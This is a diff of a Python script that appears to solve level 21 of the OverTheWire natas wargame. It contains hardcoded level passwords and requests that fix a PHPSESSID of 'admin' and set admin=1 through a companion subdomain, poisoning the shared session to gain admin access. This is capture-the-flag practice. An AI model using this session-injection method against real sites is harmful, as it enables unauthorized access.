@@ -2,26 +2,25 @@ import base64
 import requests
 from requests.auth import HTTPBasicAuth
 
-basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
+basic_auth = HTTPBasicAuth('natas21', 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH')
 
-url = "http://natas20.natas.labs.overthewire.org/index.php?debug"
-
-
-def encode_cookie(cookie: str) -> str:
-    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
-    return encoded_cookie.decode('ascii')
+url1 = "http://natas21.natas.labs.overthewire.org/index.php"
+url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1"
 
 
-def send_request() -> str:
-    cookie = "PHPSESSID=" + "brafbmkkbb2tmhhrn5m68r36n2"
+def send_request(url) -> str:
+    cookie = "PHPSESSID=" + "admin"
+
     headers = {'Content-Type': 'text/html; charset=UTF-8',
                'Cookie': cookie}
-    body = {"name": "admin"}
-    response = requests.post(url, headers=headers,
-                             auth=basic_auth, json=body, verify=False)
+    response = requests.get(url, headers=headers,
+                            auth=basic_auth,
+                            verify=False)
     return response.text
 
 
 if __name__ == '__main__':
-    text = send_request()
+    text = send_request(url2 + "&submit=1&admin=1")
+    print(text)
+    text = send_request(url1)
     print(text)
